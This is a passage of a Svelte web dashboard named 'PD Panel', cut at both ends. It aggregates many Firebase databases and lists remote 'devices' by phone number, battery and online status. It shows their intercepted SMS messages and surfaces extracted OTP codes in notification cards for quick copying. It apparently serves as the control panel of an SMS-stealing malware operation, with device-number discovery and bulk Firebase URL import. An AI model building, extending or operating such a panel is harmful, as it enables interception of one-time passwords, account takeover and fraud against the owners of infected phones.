      next.delete("on");
    } else if (next.has(f)) {
      next.delete(f);
    } else {
      next.add(f);
    }
    tableActiveFilters = next;
  }

  let selectedInfo = $derived(
    selectedKey && selectedConnId
      ? getDevInfo(selectedConnId, selectedKey)
      : null,
  );

  let selectedConn = $derived(
    selectedConnId ? connections.find((c) => c.id === selectedConnId) : null,
  );

  let connStats = $derived(
    connections.map((c) => {
      const e = db[c.id];
      const devs = allDevices.filter((d) => d.connId === c.id);
      const onl = devs.filter((d) => d.info && isOnline(d.info)).length;
      return {
        ...c,
        keyCount: e?.keys ? Object.keys(e.keys).length : 0,
        loading: !!e?.loading,
        error: e?.error ?? null,
        online: onl,
        total: devs.length,
      };
    }).sort((a, b) => {
      const aErr = a.error ? 1 : 0, bErr = b.error ? 1 : 0;
      if (aErr !== bErr) return aErr - bErr;
      const aEmpty = (!a.loading && a.total === 0) ? 1 : 0;
      const bEmpty = (!b.loading && b.total === 0) ? 1 : 0;
      if (aEmpty !== bEmpty) return aEmpty - bEmpty;
      return b.online - a.online;
    }),
  );

  // ── Filtered messages ─────────────────────────────────────────────────────
  let filteredMsgs = $derived(
    (() => {
      if (!msgs || typeof msgs !== "object") return [];
      const q = msgsSearch.toLowerCase();
      return Object.entries(msgs)
        .filter(([, m]) => {
          if (typeof m !== "object" || !m) return false;
          if (msgsFilter === "in" && m.type !== "incoming") return false;
          if (msgsFilter === "out" && m.type !== "outgoing") return false;
          if (q) {
            const hay =
              `${m.sender ?? ""} ${m.message ?? ""} ${m.dateTime ?? ""}`.toLowerCase();
            if (!hay.includes(q)) return false;
          }
          return true;
        })
        .sort(([a], [b]) => Number(b) - Number(a)); // newest first
    })(),
  );
</script>

<svelte:window
  onkeydown={(e) => {
    if (e.key === "Escape") {
      showBellPanel = false;
      addOpen = false;
      rawOpen = false;
    }
  }}
/>

<div class="shell">
  <!-- Mobile sidebar backdrop -->
  {#if sideOpen}
    <div
      class="mob-backdrop"
      onclick={() => (sideOpen = false)}
      role="presentation"
    ></div>
  {/if}

  <!-- ══ LEFT SIDEBAR ════════════════════════════════════════════════════════ -->
  <aside class="sidebar {sideOpen ? 'mob-open' : ''}">
    <!-- Brand + close button -->
    <div class="side-brand">
      <svg width="17" height="17" viewBox="0 0 32 32" fill="none">
        <path d="M5 27L10.5 6l7 13 4-9 5.5 17H5z" fill="url(#sbg)" />
        <defs
          ><linearGradient
            id="sbg"
            x1="5"
            y1="6"
            x2="27"
            y2="27"
            gradientUnits="userSpaceOnUse"
          >
            <stop stop-color="#f97316" /><stop
              offset="1"
              stop-color="#fbbf24"
            />
          </linearGradient></defs
        >
      </svg>
      <span class="brand-txt">PD Panel</span>
      {#if onlineCount > 0}<span class="side-online-pill">{onlineCount} 🟢</span
        >{/if}
      <button
        class="side-close-btn"
        onclick={() => (sideOpen = false)}
        aria-label="Close sidebar"
      >
        <svg
          width="14"
          height="14"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          stroke-width="2.5"><path d="M18 6 6 18M6 6l12 12" /></svg
        >
      </button>
    </div>

    <!-- Sidebar tabs: Firebase | Devices -->
    <div class="side-tabs">
      <button
        class="side-tab-btn {sideTab === 'firebase' ? 'stab-a' : ''}"
        onclick={() => (sideTab = "firebase")}
      >
        Firebase <span class="stab-cnt">{connections.length}</span>
      </button>
      <button
        class="side-tab-btn {sideTab === 'devices' ? 'stab-a' : ''}"
        onclick={() => (sideTab = "devices")}
      >
        Devices <span class="stab-cnt">{allDevices.length}</span>
      </button>
    </div>

    <!-- Firebase connections tab -->
    {#if sideTab === "firebase"}
      <div class="side-footer side-footer-full">
        <div class="sf-hdr">
          FIREBASE · {connections.length}
          <button
            class="add-fb-inline"
            onclick={() => (addOpen = true)}
            title="Add Firebase"
            aria-label="Add Firebase"
          >
            <svg
              width="11"
              height="11"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2.5"><path d="M12 5v14M5 12h14" /></svg
            >
          </button>
        </div>
        <div class="conn-scroll conn-scroll-full" use:dragScroll>
          {#each connStats as c (c.id)}
            <div class="conn-row">
              <span class="cr-dot" style="background:{c.color}"></span>
              <span class="cr-name">{c.name}</span>
              <span
                class="cr-status"
                title="{c.online} online / {c.total} total"
              >
                {#if c.total > 0}
                  <span
                    class="cr-on-dot"
                    style="background:{c.online > 0 ? '#22c55e' : '#334155'}"
                  ></span>
                  <span
                    style="color:{c.online > 0
                      ? '#22c55e'
                      : '#64748b'};font-size:9px;font-weight:700"
                    >{c.online}/{c.total}</span
                  >
                {:else}
                  <span
                    class="cr-cnt"
                    style="color:{c.error ? '#ef4444' : c.color}"
                    >{c.loading ? "…" : c.error ? "!" : "0"}</span
                  >
                {/if}
              </span>
              <button
                class="cr-tog {c.enabled ? 'ton' : 'toff'}"
                onclick={() => toggleConn(c.id)}
                aria-label="toggle"
              >
                <span class="cr-knob"></span>
              </button>
              <button
                class="cr-rm"
                onclick={() => dropConn(c.id)}
                title="Remove"
                aria-label="remove">×</button
              >
            </div>
          {/each}
        </div>
      </div>
    {/if}

    <!-- Devices list tab -->
    {#if sideTab === "devices"}
      <div class="side-footer side-footer-full">
        <!-- Search -->
        <div class="side-dev-search">
          <svg
            width="11"
            height="11"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2.5"
            opacity="0.4"
            ><circle cx="11" cy="11" r="8" /><path d="m21 21-4.35-4.35" /></svg
          >
          <input
            class="side-dev-search-in"
            bind:value={searchQuery}
            placeholder="Search devices…"
            aria-label="Search devices"
          />
          {#if searchQuery}<button
              class="side-search-clear"
              onclick={() => (searchQuery = "")}>×</button
            >{/if}
        </div>
        <!-- Filter pills -->
        <div class="side-dev-pills">
          <button
            class="sdp {sideFilter === 'all' ? 'sdp-a' : ''}"
            onclick={() => (sideFilter = "all")}
            >All <span class="sdp-cnt">{allDevices.length}</span></button
          >
          <button
            class="sdp {sideFilter === 'on' ? 'sdp-on' : ''}"
            onclick={() => (sideFilter = "on")}
            >🟢 <span class="sdp-cnt">{onlineCount}</span></button
          >
          <button
            class="sdp {sideFilter === 'num' ? 'sdp-num' : ''}"
            onclick={() => (sideFilter = "num")}
            >📱 <span class="sdp-cnt">{numCount}</span></button
          >
          <button
            class="sdp {sideFilter === 'numOn' ? 'sdp-numon' : ''}"
            onclick={() => (sideFilter = "numOn")}
            title="Number + Online"
            >📱🟢 <span class="sdp-cnt">{onlineNumCount}</span></button
          >
          <button
            class="sdp {sideFilter === 'off' ? 'sdp-off' : ''}"
            onclick={() => (sideFilter = "off")}
            >🔴 <span class="sdp-cnt">{offlineCount}</span></button
          >
        </div>
        <!-- Device list -->
        <div
          class="side-dev-list"
          onscroll={(e) => {
            const el = e.currentTarget;
            if (el.scrollTop + el.clientHeight >= el.scrollHeight - 200) {
              if (filteredSide.length > sideLimit) sideLimit += 100;
            }
          }}
        >
          {#each filteredSide.slice(0, sideLimit) as d (`${d.connId}::${d.key}`)}
            {@const on = d.info ? isOnline(d.info) : null}
            {@const bat = d.info ? getBattery(d.info) : null}
            {@const fp = getDisplayPhone(d.connId, d.key, d.info)}
            <div
              class="sdv-item {selectedKey === d.key &&
              selectedConnId === d.connId
                ? 'sdv-sel'
                : ''}"
              role="button"
              tabindex="0"
              onkeydown={(e) => {
                if (e.key === "Enter" || e.key === " ") {
                  selectDevice(d.connId, d.key);
                  sideOpen = false;
                }
              }}
              onclick={() => {
                selectDevice(d.connId, d.key);
                sideOpen = false;
              }}
              aria-label="Select device {d.key}"
            >
              <span class="sdv-bar" style="background:{d.conn.color}"></span>
              <span
                class="sdv-dot {on === true
                  ? 'ton'
                  : on === false
                    ? 'toff'
                    : 'tunk'}"
              ></span>
              <span class="sdv-body">
                <span class="sdv-id mono"
                  >{d.key.slice(0, 15)}{d.key.length > 15 ? "…" : ""}</span
                >
                {#if fp}
                  <button
                    class="sdv-phone-btn"
                    title="Click to copy number"
                    onclick={(e) => {
                      e.stopPropagation();
                      copyPhone(fp);
                    }}
                  >{fp}</button>
                {:else}
                  <span class="sdv-fb" style="color:{d.conn.color}"
                    >{d.conn.name}</span
                  >
                {/if}
              </span>
              {#if bat !== null}
                <span class="sdv-bat" style="color:{batColor(bat)}">{bat}%</span
                >
              {/if}
              {#if fp}
                <button
                  class="sdv-copy"
                  title="Copy number"
                  aria-label="Copy number"
                  onclick={(e) => {
                    e.stopPropagation();
                    copyPhone(fp);
                  }}
                >
                  <svg
                    width="10"
                    height="10"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                    ><rect x="9" y="9" width="13" height="13" rx="2" /><path
                      d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                    /></svg
                  >
                </button>
              {/if}
            </div>
          {/each}
          {#if filteredSide.length === 0}
            <div class="sdv-empty">No devices found</div>
          {/if}
          {#if filteredSide.length > sideLimit}
            <button class="sdv-more" onclick={() => (sideLimit += 100)}
              >+ {Math.min(100, filteredSide.length - sideLimit)} more…</button
            >
          {/if}
        </div>
      </div>
    {/if}
  </aside>

  <!-- ══ MAIN ════════════════════════════════════════════════════════════════ -->
  <div class="main">
    <!-- Topbar -->
    <header class="topbar">
      <div class="tb-l">
        <!-- Mobile hamburger -->
        <button
          class="mob-menu-btn"
          onclick={() => (sideOpen = !sideOpen)}
          aria-label="Toggle sidebar"
        >
          {#if sideOpen}
            <svg
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2.5"><path d="M18 6 6 18M6 6l12 12" /></svg
            >
          {:else}
            <svg
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2.5"
              ><line x1="3" y1="6" x2="21" y2="6" /><line
                x1="3"
                y1="12"
                x2="21"
                y2="12"
              /><line x1="3" y1="18" x2="21" y2="18" /></svg
            >
          {/if}
        </button>
        {#each connections as c}
          {#if db[c.id]?.loading}
            <span
              style="font-size:11px;color:{c.color};display:flex;align-items:center;gap:3px"
            >
              <span
                style="animation:spin 0.9s linear infinite;display:inline-block"
                >↻</span
              >
              {c.name}
            </span>
          {/if}
        {/each}
        {#if bgRefreshing}
          <span class="refresh-cd bg-refresh" title="Syncing in background…">
            <span class="bg-dot"></span> syncing…
          </span>
        {:else if !connections.some((c) => db[c.id]?.loading)}
          <span
            class="refresh-cd"
            title="Next auto-refresh in {nextRefreshSecs}s"
          >
            ↻ {nextRefreshSecs}s
          </span>
        {/if}
      </div>
      <div class="tb-r">
        <span class="tbstat tt">{totalCount} total</span>
        <span class="tbstat to">{onlineCount} online</span>
        <span class="tbstat tf">{offlineCount} offline</span>
        <a
          href="/discovery"
          class="ico-btn"
          title="Device Number Discovery"
          aria-label="Device Number Discovery"
          style="text-decoration:none;font-size:12px;"
        >📡</a>
        <button
          class="ico-btn {bgRefreshing ? 'ico-active' : ''}"
          onclick={() => fetchAll(false)}
          title="Refresh All now"
          aria-label="Refresh All"
        >
          <svg
            width="13"
            height="13"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
            style={bgRefreshing ? "animation:spin 1s linear infinite" : ""}
          >
            <polyline points="23 4 23 10 17 10" />
            <polyline points="1 20 1 14 7 14" />
            <path
              d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"
            />
          </svg>
        </button>
        <!-- Bell icon with badge — opens floating notification panel -->
        <div class="bell-wrap" style="position:relative">
          <button
            class="ico-btn bell-btn {!notifsEnabled
              ? 'ico-muted'
              : ''} {showBellPanel ? 'ico-active' : ''}"
            onclick={() => (showBellPanel = !showBellPanel)}
            title={notifsEnabled ? "Notifications" : "Notifications muted"}
            aria-label="Toggle notification panel"
          >
            {#if notifsEnabled}
              <svg
                width="14"
                height="14"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
                  d="M13.73 21a2 2 0 0 1-3.46 0"
                /></svg
              >
            {:else}
              <svg
                width="14"
                height="14"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
                  d="M13.73 21a2 2 0 0 1-3.46 0"
                /><line x1="2" y1="2" x2="22" y2="22" /></svg
              >
            {/if}
          </button>
          {#if notifications.length > 0}
            <span class="notif-badge"
              >{notifications.length > 9 ? "9+" : notifications.length}</span
            >
          {/if}
        </div>
        <button
          class="ico-btn {addOpen ? 'ico-active' : ''}"
          onclick={() => (addOpen = !addOpen)}
          title="Settings & Firebase"
          aria-label="Settings"
        >
          <svg
            width="14"
            height="14"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
          >
            <circle cx="12" cy="12" r="3" />
            <path
              d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"
            />
          </svg>
        </button>
        <button
          class="ico-btn {rawOpen ? 'ico-active' : ''}"
          onclick={() => (rawOpen = !rawOpen)}
          aria-label="Raw request"
        >
          <svg
            width="13"
            height="13"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            ><polyline points="16 18 22 12 16 6" /><polyline
              points="8 6 2 12 8 18"
            /></svg
          >
        </button>
      </div>
    </header>

    <!-- ══ FLOATING NOTIFICATION PANEL ════════════════════════════════════ -->
    {#if showBellPanel}
      <div
        bind:this={bellPanelEl}
        class="bell-panel {_nrResizing ? 'bp-resizing' : ''} {_ndDragging ? 'bp-dragging' : ''}"
        style="transform:translate({notifPanelPos.x}px,{notifPanelPos.y}px); width:{notifPanelWidth}px; {notifPanelHeight ? `height:${notifPanelHeight}px;` : ''}"
      >
        <!-- Large screen resize handle: Left border -->
        <div
          class="bp-resize-edge bp-resize-left"
          role="separator"
          tabindex="-1"
          onpointerdown={(e) => notifResizeStart('left', e)}
          onpointermove={notifResizeMove}
          onpointerup={notifResizeEnd}
          onpointercancel={notifResizeEnd}
          ondblclick={resetNotifPanelSize}
          title="Drag to resize width · Double-click to reset"
          aria-hidden="true"
        ></div>

        <!-- Large screen resize handle: Bottom border -->
        <div
          class="bp-resize-edge bp-resize-bottom"
          role="separator"
          tabindex="-1"
          onpointerdown={(e) => notifResizeStart('bottom', e)}
          onpointermove={notifResizeMove}
          onpointerup={notifResizeEnd}
          onpointercancel={notifResizeEnd}
          ondblclick={resetNotifPanelSize}
          title="Drag to resize height · Double-click to reset"
          aria-hidden="true"
        ></div>

        <!-- Large screen resize handle: Bottom-left corner -->
        <div
          class="bp-resize-corner bp-resize-bl"
          role="separator"
          tabindex="-1"
          onpointerdown={(e) => notifResizeStart('bl', e)}
          onpointermove={notifResizeMove}
          onpointerup={notifResizeEnd}
          onpointercancel={notifResizeEnd}
          ondblclick={resetNotifPanelSize}
          title="Drag to resize width & height · Double-click to reset"
          aria-hidden="true"
        ></div>

        <!-- Large screen resize handle: Bottom-right corner with visual grip dots -->
        <div
          class="bp-resize-corner bp-resize-br"
          role="separator"
          tabindex="-1"
          onpointerdown={(e) => notifResizeStart('br', e)}
          onpointermove={notifResizeMove}
          onpointerup={notifResizeEnd}
          onpointercancel={notifResizeEnd}
          ondblclick={resetNotifPanelSize}
          title="Drag to resize · Double-click to reset"
          aria-hidden="true"
        >
          <svg width="10" height="10" viewBox="0 0 10 10" fill="none" class="bp-grip-icon">
            <circle cx="8" cy="8" r="1" fill="currentColor" />
            <circle cx="8" cy="5" r="1" fill="currentColor" />
            <circle cx="8" cy="2" r="1" fill="currentColor" />
            <circle cx="5" cy="8" r="1" fill="currentColor" />
            <circle cx="5" cy="5" r="1" fill="currentColor" />
            <circle cx="2" cy="8" r="1" fill="currentColor" />
          </svg>
        </div>

        <!-- Draggable panel header -->
        <div
          class="bp-hdr bp-drag-handle"
          role="toolbar"
          tabindex="0"
          aria-label="Notification panel header drag handle"
          onpointerdown={notifPanelDragStart}
          onpointermove={notifPanelDragMove}
          onpointerup={notifPanelDragEnd}
          onpointercancel={notifPanelDragEnd}
          ondblclick={resetNotifPanelSize}
          style="cursor:{_ndDragging
            ? 'grabbing'
            : 'grab'};touch-action:none;user-select:none"
        >
          <span class="bp-title"
            >Notifications {#if notifications.length > 0}<span class="bp-cnt"
                >({notifications.length})</span
              >{/if}</span
          >
          <div class="bp-actions" role="toolbar" tabindex="-1" aria-label="Notification actions" onpointerdown={(e) => e.stopPropagation()}>
            <!-- Mute toggle -->
            <button
              class="bp-icon-btn {!notifsEnabled ? 'bp-muted' : ''}"
              onclick={(e) => {
                e.stopPropagation();
                toggleNotifsEnabled();
              }}
              title={notifsEnabled ? "Mute" : "Unmute"}
              aria-label="Toggle mute"
            >
              {#if notifsEnabled}
                <svg
                  width="13"
                  height="13"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
                    d="M13.73 21a2 2 0 0 1-3.46 0"
                  /></svg
                >
              {:else}
                <svg
                  width="13"
                  height="13"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
                    d="M13.73 21a2 2 0 0 1-3.46 0"
                  /><line x1="2" y1="2" x2="22" y2="22" /></svg
                >
              {/if}
            </button>
            <!-- Reset size/position button if custom size or position -->
            {#if notifPanelWidth !== 360 || notifPanelHeight !== null || notifPanelPos.x !== 0 || notifPanelPos.y !== 0}
              <button
                class="bp-icon-btn"
                onclick={(e) => {
                  e.stopPropagation();
                  resetNotifPanelSize();
                }}
                title="Reset panel size and position"
                aria-label="Reset panel size and position"
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  ><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8" /><path
                    d="M3 3v5h5"
                  /></svg
                >
              </button>
            {/if}
            <!-- Clear all -->
            {#if notifications.length > 0}
              <button
                class="bp-icon-btn bp-clear-btn"
                onclick={(e) => {
                  e.stopPropagation();
                  clearAllNotifs();
                }}
                title="Clear all notifications"
                aria-label="Clear all notifications"
              >
                <svg
                  width="13"
                  height="13"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  ><polyline points="3 6 5 6 21 6" /><path
                    d="M19 6l-1 14H6L5 6"
                  /><path d="M10 11v6M14 11v6" /></svg
                >
              </button>
            {/if}
            <!-- Collapse / Close cross button -->
            <button
              class="bp-icon-btn bp-close-btn"
              onclick={(e) => {
                e.stopPropagation();
                showBellPanel = false;
              }}
              title="Close panel"
              aria-label="Close"
            >
              <svg
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2.5"><path d="M18 6 6 18M6 6l12 12" /></svg
              >
            </button>
          </div>
        </div>

        <!-- Notification list -->
        {#if notifications.length === 0}
          <div class="bp-empty">
            {#if !notifsEnabled}
              <span>🔕 Notifications muted</span>
            {:else}
              <span>No new notifications</span>
            {/if}
          </div>
        {:else}
          <div class="bp-list">
            {#each notifications as n (n.id)}
              {@const msgFull = n.message ?? ""}
              {@const msgShort =
                msgFull.length > 120 ? msgFull.slice(0, 120) + "…" : msgFull}
              <div class="bp-card {n.leaving ? 'nleave' : ''}">
                <!-- Row 1: App icon + sender + OTP label + time + dismiss -->
                <div class="bp-card-top">
                  <div
                    class="bp-app-icon"
                    style="background:{n.conn?.color ??
                      '#f97316'}22;border-color:{n.conn?.color ?? '#f97316'}44"
                  >
                    <svg
                      width="14"
                      height="14"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke={n.conn?.color ?? "#f97316"}
                      stroke-width="2"
                      ><rect x="5" y="2" width="14" height="20" rx="2" /><path
                        d="M12 18h.01"
                      /></svg
                    >
                  </div>
                  <div class="bp-card-mid">
                    <span class="bp-sender"
                      >{n.sender ?? "?"}{n.about ? ` · ${n.about}` : ""} ·
                      <span style="color:#64748b">OTP</span></span
                    >
                    <span class="bp-msg-preview">{msgShort}</span>
                  </div>
                  <span class="bp-time">{toIST(n.ts)}</span>
                  <button
                    class="n-close"
                    onclick={(e) => {
                      e.stopPropagation();
                      dismissNotif(n.id);
                    }}
                    title="Dismiss notification"
                    aria-label="Dismiss">×</button
                  >
                </div>
                <!-- Row 2: OTP green pill + device ID + copy + navigate -->
                {#if n.otp}
                  <div class="bp-card-bot">
                    <button
                      class="bp-otp-pill"
                      onclick={() => {
                        copyText(n.otp);
                        toast(`OTP ${n.otp} copied!`, "success");
                      }}
                      title="Tap to copy OTP"
                    >
                      <svg
                        width="11"
                        height="11"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2.5"
                        style="opacity:0.6"
                        ><rect
                          x="3"
                          y="11"
                          width="18"
                          height="11"
                          rx="2"
                        /><path d="M7 11V7a5 5 0 0 1 10 0v4" /></svg
                      >
                      <code class="bp-otp-code">{n.otp}</code>
                      <svg
                        width="10"
                        height="10"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        ><rect x="9" y="9" width="13" height="13" rx="2" /><path
                          d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                        /></svg
                      >
                    </button>
                    <button
                      class="bp-dev-pill"
                      onclick={(e) => {
                        e.stopPropagation();
                        copyText(n.devKey ?? "");
                        toast("Device ID copied", "success");
                      }}
                      title="Copy device ID"
                    >
                      <svg
                        width="10"
                        height="10"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        ><rect x="5" y="2" width="14" height="20" rx="2" /></svg
                      >
                      <span class="mono">{(n.devKey ?? "").slice(0, 8)}…</span>
                      <svg
                        width="9"
                        height="9"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        ><rect x="9" y="9" width="13" height="13" rx="2" /><path
                          d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                        /></svg
                      >
                    </button>
                    <button
                      class="bp-nav-btn"
                      onclick={() => {
                        navigateToDevice(n.connId, n.devKey);
                        showBellPanel = false;
                      }}
                      title="Go to device"
                    >
                      <svg
                        width="13"
                        height="13"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2.5"
                        ><path d="M7 17L17 7M7 7h10v10" /></svg
                      >
                    </button>
                    <!-- Green progress bar -->
                    <div class="bp-progress"></div>
                  </div>
                {:else}
                  <div class="bp-card-bot">
                    <span class="bp-verif-chip">VERIF</span>
                    <span class="bp-verif-text"
                      >{msgFull.slice(0, 40)}{msgFull.length > 40
                        ? "…"
                        : ""}</span
                    >
                    <button
                      class="bp-nav-btn"
                      onclick={() => {
                        navigateToDevice(n.connId, n.devKey);
                        showBellPanel = false;
                      }}
                      aria-label="View device"
                      title="View device"
                    >
                      <svg
                        width="13"
                        height="13"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2.5"
                        ><path d="M7 17L17 7M7 7h10v10" /></svg
                      >
                    </button>
                  </div>
                {/if}
              </div>
            {/each}
          </div>
        {/if}
      </div>
    {/if}

    <!-- Add Firebase panel -->
    {#if addOpen}
      <div class="add-panel">
        <div class="ap-hdr">
          <span>Add Firebase Connection</span>
        <div class="ap-mode-toggle">
            <button class="ap-mode-btn {addPanelMode === 'single' ? 'ap-mode-active' : ''}" onclick={() => addPanelMode='single'}>Single</button>
            <button class="ap-mode-btn {addPanelMode === 'bulk' ? 'ap-mode-active' : ''}" onclick={() => addPanelMode='bulk'}>Bulk</button>
            <button class="ap-mode-btn {addPanelMode === 'extract' ? 'ap-mode-active' : ''}" onclick={() => addPanelMode='extract'}>
              <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
              Extract
            </button>
          </div>
          <button class="ico-btn" onclick={() => (addOpen = false)} aria-label="Close">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18M6 6l12 12" /></svg>
          </button>
        </div>

        {#if addPanelMode === 'single'}
          <div class="ap-grid">
            <div class="field"><label for="fn">Name</label><input id="fn" bind:value={form.name} placeholder="project-name" /></div>
            <div class="field"><label for="fu">Firebase URL</label><input id="fu" bind:value={form.url} onpaste={handleUrlPaste} placeholder="https://xxx-default-rtdb.firebaseio.com" /></div>
            <div class="field"><label for="fp">Messages Path</label><input id="fp" bind:value={form.path} placeholder="messages" /></div>
            <div class="field"><label for="fi">Device Info Path</label><input id="fi" bind:value={form.infoPath} placeholder="devices (optional)" /></div>
            <div class="field"><label for="ft">Auth Token</label><input id="ft" type="password" bind:value={form.token} placeholder="optional" /></div>
          </div>
          <div class="ap-foot">
            <button class="btn btn-ghost" onclick={() => (addOpen = false)}>Cancel</button>
            <button class="btn btn-primary" onclick={addConn}>Connect</button>
          </div>
        {:else if addPanelMode === 'bulk'}
          <div class="bulk-area">
            <div class="bulk-hint">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
              <span>Paste Firebase RTDB URLs — one per line, numbered, comma-separated, or mixed text. All valid URLs are extracted automatically.</span>
            </div>
            <textarea class="bulk-input" bind:value={bulkText} placeholder={`1. https://project1-default-rtdb.firebaseio.com\n2. https://project2-default-rtdb.firebaseio.com\n3. https://project3-default-rtdb.firebaseio.com`} rows="5" aria-label="Bulk Firebase URLs"></textarea>

            <!-- Editable detected URL list -->
            {#if bulkEditableUrls.length}
              <div class="bulk-preview">
                <div class="bulk-preview-hdr">
                  <span class="bulk-count">{bulkEditableUrls.length} URL{bulkEditableUrls.length > 1 ? 's' : ''} detected</span>
                  <div style="display:flex;gap:6px">
                    <button class="bulk-action-btn" onclick={copyAllBulkUrls} title="Copy all URLs">
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                      Copy All
                    </button>
                    <button class="bulk-action-btn bulk-clear-btn" onclick={() => { bulkText = ''; }} title="Clear all URLs">
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/></svg>
                      Clear
                    </button>
                  </div>
                </div>
                <div class="bulk-urls">
                  {#each bulkEditableUrls as item, i (item.url)}
                    <div class="bulk-url-row">
                      <span class="bulk-idx">{i + 1}</span>
                      <input
                        class="bulk-url-edit"
                        value={item.url}
                        onchange={(e) => updateBulkUrl(item.url, e.currentTarget.value)}
                        aria-label="Firebase URL {i+1}"
                      />
                      {#if item.dup}<span class="bulk-dup">already added</span>{/if}
                      <button class="bulk-rm-btn" onclick={() => removeBulkUrl(item.url)} title="Remove" aria-label="Remove URL">×</button>
                    </div>
                  {/each}
                </div>
              </div>
            {/if}

            <div class="ap-foot">
              <button class="btn btn-ghost" onclick={() => { bulkText=''; addPanelMode='single'; }}>Cancel</button>
              <button class="btn btn-primary" onclick={addBulkConns} disabled={!bulkParsed.length}>
                {#if bulkParsed.filter(u => !connections.find(c => c.url.replace(/\/+$/,'') === u)).length > 0}
                  Add {bulkParsed.filter(u => !connections.find(c => c.url.replace(/\/+$/,'') === u)).length} Connection{bulkParsed.filter(u => !connections.find(c => c.url.replace(/\/+$/,'') === u)).length !== 1 ? 's' : ''}
                {:else}
                  No New URLs
                {/if}
              </button>
            </div>
          </div>
        {:else if addPanelMode === 'extract'}
          <!-- ═══════════════ Universal Extractor ═══════════════ -->
          <div class="ux-container">
            <!-- Input area + file drop zone -->
            <div
              class="ux-drop-zone {uxDragActive ? 'ux-drop-active' : ''}"
              ondragover={uxHandleDragOver}
              ondragleave={uxHandleDragLeave}
              ondrop={uxHandleDrop}
              role="region"
